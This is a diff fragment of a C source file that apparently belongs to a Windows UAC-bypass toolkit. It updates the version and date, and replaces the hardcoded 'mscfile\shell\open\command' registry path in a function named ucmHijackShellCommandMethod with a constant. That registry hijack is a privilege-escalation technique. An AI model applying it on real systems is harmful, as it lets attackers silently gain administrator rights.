@@ -4,9 +4,9 @@
 *
 *  TITLE:       ENIGMA0X3.C
 *
-*  VERSION:     2.76
+*  VERSION:     2.82
 *
-*  DATE:        12 July 2017
+*  DATE:        02 Nov 2017
 *
 *  Enigma0x3 autoelevation methods and everything based on the same
 *  ShellExecute related registry manipulations idea.
@@ -89,7 +89,7 @@ BOOL ucmHijackShellCommandMethod(
 
         lResult = RegCreateKeyEx(
             HKEY_CURRENT_USER,
-            L"Software\\Classes\\mscfile\\shell\\open\\command",
+            T_MSC_SHELL,
             0,
             NULL,
             REG_OPTION_NON_VOLATILE,
